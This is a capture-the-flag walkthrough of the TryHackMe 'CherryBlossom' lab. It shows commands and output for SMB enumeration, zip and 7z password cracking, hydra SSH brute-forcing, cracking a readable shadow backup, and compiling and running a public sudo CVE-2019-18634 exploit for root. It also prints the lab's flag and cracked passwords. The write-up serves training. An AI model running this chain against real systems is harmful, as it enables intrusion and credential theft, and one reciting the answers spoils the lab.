## CherryBlossom TryHackMe
## Difficulty = Hard
<hr>

Lets get started

# Recon

## PortScanning

command:```sudo nmap -A 10.10.244.236 -T4  -v -p-```

```
# Nmap 7.93 scan initiated Sat May 13 12:23:09 2023 as: nmap -A -T4 -v -p- -oN cherry_blossom 10.10.244.236
Increasing send delay for 10.10.244.236 from 0 to 5 due to 1624 out of 4059 dropped probes since last increase.
Increasing send delay for 10.10.244.236 from 5 to 10 due to 11 out of 16 dropped probes since last increase.
Nmap scan report for 10.10.244.236
Host is up (0.20s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 21ee304ff8f79f326e4295f21a1a04d3 (RSA)
|   256 dcfcded6ec436100549b7c401e8f52c4 (ECDSA)
|_  256 1281256e0864f6eff50c58711838a5c6 (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=5/13%OT=22%CT=1%CU=41148%PV=Y%DS=2%DC=T%G=Y%TM=645F76A
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=I%TS=A)SEQ(SP=1
OS:06%GCD=1%ISR=10B%TI=Z%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=I%II=I%
OS:TS=A)OPS(O1=M506ST11NW6%O2=M506ST11NW6%O3=M506NNT11NW6%O4=M506ST11NW6%O5
OS:=M506ST11NW6%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=
OS:68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%
OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0
OS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S
OS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
OS:%T=40%CD=S)

Uptime guess: 32.219 days (since Tue Apr 11 07:22:43 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: UBUNTU; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -19m59s, deviation: 34m37s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| nbstat: NetBIOS name: UBUNTU, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| Names:
|   UBUNTU<00>           Flags: <unique><active>
|   UBUNTU<03>           Flags: <unique><active>
|   UBUNTU<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-05-13T11:38:01
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: cherryblossom
|   NetBIOS computer name: UBUNTU\x00
|   Domain name: \x00
|   FQDN: cherryblossom
|_  System time: 2023-05-13T12:38:01+01:00

TRACEROUTE (using port 143/tcp)
HOP RTT       ADDRESS
1   239.38 ms 10.18.0.1
2   239.43 ms 10.10.244.236

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat May 13 12:38:08 2023 -- 1 IP address (1 host up) scanned in 899.74 seconds
```
From our scan, we have 3 opened ports. Port 22 which runs ssh, port 139&445 which runs netbios. We'll be starting our enumeration from the smb ports.



# Enumeration (Port 139 & Port 445)

Since this is running Samba, lets check for available shares on the smb server

command:```smbclient -L 10.10.244.236```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/99e10e4d-2ac2-41a6-90fc-829c010eb8cb)

We have a sharename ```Anonymous```, lets try to access this share

command:```smbclient //10.10.244.236/Anonymous```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/88db4e04-d65b-48d8-aa3f-80288f6c0571)

**_Note: When it prompts you for a password, just hit the enter key and you'll be logged in._**

cool, we are logged in. We can go ahead and look for files that are available on this server

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c5c5db95-d2e9-4506-ae14-3c8cdb79c652)

There's a ```journal.txt``` file on the server. Lets download  this to our machine using the ```get``` command.

command:```get journal.txt```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/57e548ee-2598-4ac9-a343-2d049f2935e6)

We have successfully downloaded the file to our machine. Since there's no other file available on the server we can go ahead and use the ```exit``` command.

The next step now  is analyzing the ```journal.txt``` file we got from the smb server. I'll be using the text editor ```gedit``` to view the contents of the file, know that you can always use the text editor of your choice hehe.

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b9471ae3-2603-4d81-a93c-d6d61702a8fd)

Now, this is a base64 encoding, lets try to decode this using [cyberchef](https://gchq.github.io/CyberChef/)

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3678e6f0-0808-47e0-93bb-fa6cfa912124)

As you can see from the above screenshot, we have something that looks like a ```png header```. What this means is that the base64 encoding contains a ```png image```. So what we can do is decode the base64 encoding into an image. To do this we will be using this python script

```
import base64

# Read the base64-encoded string from the file
with open("journal.txt", "r") as f:
    base64_string = f.read().strip()

# Decode the base64 string into bytes
image_bytes = base64.b64decode(base64_string)

# Write the bytes to a PNG file
with open("image.png", "wb") as f:
    f.write(image_bytes)
```
<font color="green">This code reads a base64-encoded string from a file (journal.txt), decodes it into binary data, and writes the resulting data to a PNG image file.</font>

Save this in a file say ```bankai.py```, ensure this is in the same directory as the ```journal.txt``` file.

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/Cherry_Blossom]
└─$ gedit bankai.py                    
                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/Cherry_Blossom]
└─$ ls            
bankai.py  cherry_blossom  journal.txt
                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/Cherry_Blossom]
└─$ python bankai.py 
                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/Cherry_Blossom]
└─$ ls
bankai.py  cherry_blossom  image.png  journal.txt
```
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c49b7eb0-402b-4a37-bb2d-f0ce040f8394)

As you can see, we got ourselves a png image.

From the hint that was provided 

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/04c8158c-96e3-4cf4-a12f-0352e757791f)

This makes it more obvious that steganography is the way to go hehe😎. Navigating to the link provided in the hint 

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5ff0e91a-278b-464a-bc17-4f7c012f3cf9)

Well, I didn't do use this lool. We'll be using a tool called ```stegpy```. You can get it [here](https://github.com/dhsdshdhk/stegpy)

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/Cherry_Blossom]
└─$ git clone https://github.com/dhsdshdhk/stegpy.git                     
Cloning into 'stegpy'...
remote: Enumerating objects: 291, done.
remote: Counting objects: 100% (35/35), done.
remote: Compressing objects: 100% (27/27), done.
remote: Total 291 (delta 12), reused 22 (delta 8), pack-reused 256
Receiving objects: 100% (291/291), 6.92 MiB | 763.00 KiB/s, done.
Resolving deltas: 100% (143/143), done.
                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/Cherry_Blossom]
└─$ cd stegpy                  
                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/Cherry_Blossom/stegpy]
└─$ cd stegpy 
                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/…/TryHackMe/Cherry_Blossom/stegpy/stegpy]
└─$ ls
crypt.py  __init__.py  lsb.py  steg.py  test.npy  tests.py
                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/…/TryHackMe/Cherry_Blossom/stegpy/stegpy]
└─$ python steg.py -h
usage: steg.py [-h] [-p] [-b [{1,2,4}]] [-c] [a ...] b

Simple steganography program based on the LSB method.

positional arguments:
  a                     file or message to encode (if none, will read host)
  b                     host file

options:
  -h, --help            show this help message and exit
  -p, --password        set password to encrypt or decrypt a hidden file
  -b [{1,2,4}], --bits [{1,2,4}]
                        number of bits per byte (default is 2)
  -c, --check           check free space of argument files
```
Now, lets extract hidden informations from our ```image.png``` file.

command:```python steg.py ../../image.png```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0401c9e8-f137-4973-abf1-304aa850e906)

This  looks so unusual😂, a ```.zip``` extension having a ```jpeg``` header😂. Well, there's a solution for this abnormality.

What we'll be doing is changing the header from that of a ```jpeg``` image data to a ```zip``` file using a tool called ```hexeditor```. This tools come preinstalled with kali linux.

command:```hexeditor _journal.png```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b2736842-b5fe-4269-aa01-6aeec1da98ca)

We'll be changing the ```FF D8 FF D8``` to ```50 4B 03 04```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/53fedace-718c-4f18-9a08-1f235ff54495)

It has been successfully changed, to save this hit ```ctrl + x``` then the ```enter key```

```
┌──(bl4ck4non㉿bl4ck4non)-[~/…/TryHackMe/Cherry_Blossom/stegpy/stegpy]
└─$ ls               
crypt.py  __init__.py  _journal.zip  lsb.py  __pycache__  steg.py  test.npy  tests.py
                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/…/TryHackMe/Cherry_Blossom/stegpy/stegpy]
└─$ file _journal.zip
_journal.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
```
cool, now lets go ahead and extract this zip file.

```
┌──(bl4ck4non㉿bl4ck4non)-[~/…/TryHackMe/Cherry_Blossom/stegpy/stegpy]
└─$ unzip _journal.zip
Archive:  _journal.zip
[_journal.zip] Journal.ctz password: 
   skipping: Journal.ctz             incorrect password\
```
oops, we are required to provide a password to unzip the file. Well, I guess it's time to invite John to the party😎.

Lets get the password

commands:
```
zip2john _journal.zip > abeg.txt
john abeg.txt  --wordlist=/home/bl4ck4non/Documents/rockyou.txt
```

```
┌──(bl4ck4non㉿bl4ck4non)-[~/…/TryHackMe/Cherry_Blossom/stegpy/stegpy]
└─$ zip2john _journal.zip > abeg.txt
ver 2.0 efh 5455 efh 7875 _journal.zip/Journal.ctz PKZIP Encr: TS_chk, cmplen=70461, decmplen=70434, crc=0B987D84 ts=0035 cs=0035 type=8
                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/…/TryHackMe/Cherry_Blossom/stegpy/stegpy]
└─$ john abeg.txt  --wordlist=/home/bl4ck4non/Documents/rockyou.txt             
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
september        (_journal.zip/Journal.ctz)     
1g 0:00:00:00 DONE (2023-05-13 13:48) 3.030g/s 24824p/s 24824c/s 24824C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
cool, we got the password ```september```.

Now, lets unzip

```
┌──(bl4ck4non㉿bl4ck4non)-[~/…/TryHackMe/Cherry_Blossom/stegpy/stegpy]
└─$ unzip _journal.zip
Archive:  _journal.zip
[_journal.zip] Journal.ctz password: 
  inflating: Journal.ctz             
                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/…/TryHackMe/Cherry_Blossom/stegpy/stegpy]
└─$ ls
crypt.py  __init__.py  Journal.ctz  _journal.zip  lsb.py  __pycache__  steg.py  test.npy  tests.py
                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/…/TryHackMe/Cherry_Blossom/stegpy/stegpy]
└─$ file Journal.ctz 
Journal.ctz: 7-zip archive data, version 0.4
```
We sucessfully unziped the file. Upon unziping the file we were provided with a ```journal.ctz``` file, which is a ```7-zip archive data```. To extract the files from the file we'll be using a tool called ```7z```.

command:```7z e Journal.ctz```

```
┌──(bl4ck4non㉿bl4ck4non)-[~/…/TryHackMe/Cherry_Blossom/stegpy/stegpy]
└─$ 7z e Journal.ctz 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i5-4300U CPU @ 1.90GHz (40651),ASM,AES-NI)

Scanning the drive for archives:
1 file, 70434 bytes (69 KiB)

Extracting archive: Journal.ctz
--
Path = Journal.ctz
Type = 7z
Physical Size = 70434
Headers Size = 146
Method = LZMA2:16 7zAES
Solid = -
Blocks = 1

    
Enter password (will not be echoed):
'ERROR: Data Error in encrypted file. Wrong password? : Journal.ctd
                  
Sub items Errors: 1

Archives with Errors: 1

Sub items Errors: 1
```
oops, we are required to provide a password here also. Thank God John hasn't left the party😆

Lets get the password

commands:
```
7z2john Journal.ctz > hehe.txt
john hehe.txt -w=/home/bl4ck4non/Documents/rockyou.txt
```

```
┌──(bl4ck4non㉿bl4ck4non)-[~/…/TryHackMe/Cherry_Blossom/stegpy/stegpy]
└─$ 7z2john Journal.ctz > hehe.txt
ATTENTION: the hashes might contain sensitive encrypted data. Be careful when sharing or posting these hashes

┌──(bl4ck4non㉿bl4ck4non)-[~/…/TryHackMe/Cherry_Blossom/stegpy/stegpy]
└─$ john hehe.txt -w=/home/bl4ck4non/Documents/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (7z, 7-Zip archive encryption [SHA256 128/128 SSE2 4x AES])
Cost 1 (iteration count) is 524288 for all loaded hashes
Cost 2 (padding size) is 5 for all loaded hashes
Cost 3 (compression type) is 2 for all loaded hashes
Cost 4 (data length) is 70283 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tigerlily        (Journal.ctz)     
1g 0:00:05:53 DONE (2023-05-13 02:04) 0.002830g/s 15.84p/s 15.84c/s 15.84C/s ceejay..kirstie
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
John got us the password already. 

Using the password for extracting the 7z file

```
┌──(bl4ck4non㉿bl4ck4non)-[~/…/TryHackMe/Cherry_Blossom/stegpy/stegpy]
└─$ 7z e Journal.ctz              

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i5-4300U CPU @ 1.90GHz (40651),ASM,AES-NI)

Scanning the drive for archives:
1 file, 70434 bytes (69 KiB)

Extracting archive: Journal.ctz
--
Path = Journal.ctz
Type = 7z
Physical Size = 70434
Headers Size = 146
Method = LZMA2:16 7zAES
Solid = -
Blocks = 1

    
Enter password (will not be echoed):
Everything is Ok  

Size:       158136
Compressed: 70434
                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/…/TryHackMe/Cherry_Blossom/stegpy/stegpy]
└─$ ls
abeg.txt  crypt.py  hehe.txt  __init__.py  Journal.ctd  Journal.ctz  _journal.zip  lsb.py  __pycache__  steg.py  test.npy  tests.py
                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/…/TryHackMe/Cherry_Blossom/stegpy/stegpy]
└─$ file Journal.ctd 
Journal.ctd: XML 1.0 document, ASCII text, with very long lines (61172)
```
After extracting we got the file ```Journal.ctd```. 

To get the flag for the first question, just check the end of ```Journal.ctd``` file or you can choose to use the ```strings``` command.

```
┌──(bl4ck4non㉿bl4ck4non)-[~/…/TryHackMe/Cherry_Blossom/stegpy/stegpy]
└─$ ls
abeg.txt  crypt.py  hehe.txt  __init__.py  Journal.ctd  Journal.ctz  _journal.zip  lsb.py  __pycache__  steg.py  test.npy  tests.py
                                                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/…/TryHackMe/Cherry_Blossom/stegpy/stegpy]
└─$ strings Journal.ctd | grep -i "thm{"                                        
THM{054a8f1db7618f8f6a41a0b3349baa11}</rich_text>
```
FLAG:- ```THM{054a8f1db7618f8f6a41a0b3349baa11}```

Now, that we've solved the first question lets move on to the second question which is getting the user flag. 

To do this I'll be opening this file using the text editor ```gedit```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/38292f1b-2d7f-440e-8b76-89aa5e98145d)

Reading through this, we can see three names being mentioned ```Anitta```,```Harry``` and ```Lily```. 

Moving on you should see something that looks like this. 

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/90dc77b6-c36a-4334-aa02-f2ab4aef2410)

This looks like a wordlist, but the content are base64 encoded. There was a discussion where the author talked about the wordlist cherry-blossom.

What we'll do is decoding the base64 encoded texts, save it in a ```.txt``` file, if you recall we had possible usernames when were doing our enumeration. So, we'll use a tool called ```hydra``` to look for possible usernames and passwords.

First, lets decode the base64 encoding using [cyberchef](https://gchq.github.io/CyberChef/).

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bd2e1b2f-c6ee-4017-ab60-6f253b94a772)

Lets go ahead and paste the output in a file, lets say ```cherry-blossom.txt```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/43f10679-ae6e-477e-b032-88dc474bfac5)

So, we'll be using this password combination on the username ```lily```. This is to see if we can find the password for the ssh server.

command:```hydra -l lily -P cherry-blossom.txt ssh://10.10.231.170```

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/Cherry_Blossom]
└─$ hydra -l lily -P cherry-blossom.txt ssh://10.10.231.170 
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-13 18:17:23
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 9040 login tries (l:1/p:9040), ~565 tries per task
[DATA] attacking ssh://10.10.231.170:22/
[STATUS] 83.00 tries/min, 83 tries in 00:01h, 8960 to do in 01:48h, 13 active
[STATUS] 82.33 tries/min, 247 tries in 00:03h, 8796 to do in 01:47h, 13 active
[STATUS] 77.43 tries/min, 542 tries in 00:07h, 8501 to do in 01:50h, 13 active
[22][ssh] host: 10.10.231.170   login: lily   password: Mr.$un$hin3
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-05-13 18:26:21
```
cool stuff, we found the  password to be ```Mr.$un$hin3```. Lets use this to login to the ssh server

```username:lily```             ```password:Mr.$un$hin3```

command:```ssh lily@10.10.231.170```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/338079de-749b-4aff-a1f4-a6dcc4603463)

cool, we are logged in as user ```lily```. Now, lets go ahead and escalate our privileges.




# Privilege Escalation

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/98dccc01-8190-4feb-a7c4-22c94b14e14d)

We got something interesting in the ```/var/backups``` directory hehe. Why is this interesting?? Well, it is because we can view the ```shadow.bak``` file which contains the hashed passwords of users available on the machine.

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6e91ce14-98b2-4b90-8500-aee382e1c317)

Lets try to crack user ```johan``` password using a tool called ```John the Ripper```. Well, John already left the party so I had to call him back to help us out with this.

command:```john abeg  --wordlist=cherry-blossom.txt```

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/Cherry_Blossom]
└─$ john abeg  --wordlist=passwords.txt  
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
##scuffleboo##   (johan)     
1g 0:00:00:03 DONE (2023-05-13 19:02) 0.2732g/s 1958p/s 1958c/s 1958C/s #sharry#1992..#iloveyou#
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Now, lets switch to user ```johan``` using the password John found for us

command:```su johan```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/003a9d9e-f6e7-4476-9548-e8df4fb69a90)

cool hehe😎. Lets further escalate our privileges

Running the command ```sudo -l```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c64c759f-e0a4-444b-94b3-bffeb03d4b21)

From the above screenshot, you can see that we are getting the password echoed back to us, now this isn't meant to be actually. This is a function called "pwfeedback" thats enabled in the ```/etc/sudoers``` config, so basically a stack-based buffer overflow in the privileged sudo process. You can read more about it [here](https://nvd.nist.gov/vuln/detail/CVE-2019-18634)

After a little research I found an [exploit](https://github.com/saleemrashid/sudo-cve-2019-18634)

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0b19422d-c023-41ba-8fc0-148b9bb93d2f)

clone this to your machine and compile

```                                    
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/Cherry_Blossom]
└─$ git clone https://github.com/saleemrashid/sudo-cve-2019-18634.git     
Cloning into 'sudo-cve-2019-18634'...
remote: Enumerating objects: 30, done.
remote: Counting objects: 100% (30/30), done.
remote: Compressing objects: 100% (21/21), done.
remote: Total 30 (delta 14), reused 22 (delta 8), pack-reused 0
Receiving objects: 100% (30/30), 5.95 KiB | 5.95 MiB/s, done.
Resolving deltas: 100% (14/14), done.
                                                                                                                                                                       
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/Cherry_Blossom]
└─$ cd sudo-cve-2019-18634
                                                                                                                                                                       
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/Cherry_Blossom/sudo-cve-2019-18634]
└─$ ls 
exploit.c  LICENSE  Makefile  README.md
```
To compile this exploit, I tried using the ```gcc``` compiler but I was getting an error. I guess this was because the gcc compiler on my machine was the newer version. We also can't compile this on the target's machine because the compiler ```gcc``` isn't installed on the target's machine.

Well, what did I do next??

I got an idea from my sensei😎 to compile using makefile, doing my research on this led me to a compiler known as ```cc```, well this is the first time I'll also be hearing about this compiler.

command:```cc -Os -g3 -std=c11 -Wall -Wextra -Wpedantic -static -o abeg_gimme_shell exploit.c```

<font color="green">The command is a compilation command  for the C program called "exploit.c". The command compiles the exploit.c source file using the specified compiler and linker options, and produces an executable binary called "abeg_gimme_shell"</font>

Running this,

```                                                                                            
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/Cherry_Blossom/sudo-cve-2019-18634]
└─$ ls
exploit.c  LICENSE  Makefile  README.md
                                                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/Cherry_Blossom/sudo-cve-2019-18634]
└─$ cc -Os -g3 -std=c11 -Wall -Wextra -Wpedantic -static -o abeg_gimme_shell exploit.c
                                                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/Cherry_Blossom/sudo-cve-2019-18634]
└─$ ls
abeg_gimme_shell  exploit.c  LICENSE  Makefile  README.md
                                                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/Cherry_Blossom/sudo-cve-2019-18634]
└─$ file abeg_gimme_shell 
abeg_gimme_shell: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=5351fd74f389f9f811d0023f8f89c767a9236041, for GNU/Linux 3.2.0, with debug_info, not stripped
                                                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/Cherry_Blossom/sudo-cve-2019-18634]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
cool, now lets send this over to the target's machine

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2416785f-9206-4414-abb4-94cbce65c9f6)

After this, run

command:```chmod +x abeg_gimme_shell``` then ```./abeg_gimme_shell```

This should get us a root shell

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/09f71229-c514-4496-b02c-8f8d14e076f1)

We got a shell as the ```root``` user😊.

That will be all for today
<br> <br>
[Back To Home](../../index.md)














